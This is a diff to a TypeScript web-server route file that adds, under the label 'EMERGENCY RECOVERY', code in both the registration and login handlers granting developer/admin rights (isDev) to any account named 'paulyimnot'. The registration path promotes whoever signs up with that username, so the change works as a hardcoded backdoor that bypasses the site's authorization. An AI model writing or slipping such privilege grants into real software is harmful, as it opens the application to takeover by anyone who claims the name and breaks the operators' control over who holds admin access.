@@ -191,6 +191,11 @@ export async function registerRoutes(
         await db.execute(sql`INSERT INTO registration_ip_log (ip) VALUES (${ip}) ON CONFLICT DO NOTHING`);
       }
        // @ts-ignore
+      // 🛡️ EMERGENCY RECOVERY: Auto-promote owner to Admin
+      if (user.username === "paulyimnot") {
+        await db.update(users).set({ isDev: true }).where(eq(users.id, user.id));
+        user.isDev = true;
+      }
       req.session.userId = user.id;
       const { password: _, ...safeUser } = user;
       res.status(201).json(safeUser);
@@ -256,6 +261,12 @@ export async function registerRoutes(
       // @ts-ignore
       req.session.userId = user.id;
       console.log(`[LOGIN] Login successful for "${rawTrimmed}", session userId set to ${user.id}`);
+      // 🛡️ EMERGENCY RECOVERY: Auto-promote owner to Admin
+      if (user.username.toLowerCase() === "paulyimnot") {
+        await db.update(users).set({ isDev: true }).where(eq(users.id, user.id));
+        user.isDev = true;
+      }
+
       const { password: _, totpSecret: _s, ...safeUser } = user;
       res.json(safeUser);
     } catch (err) {
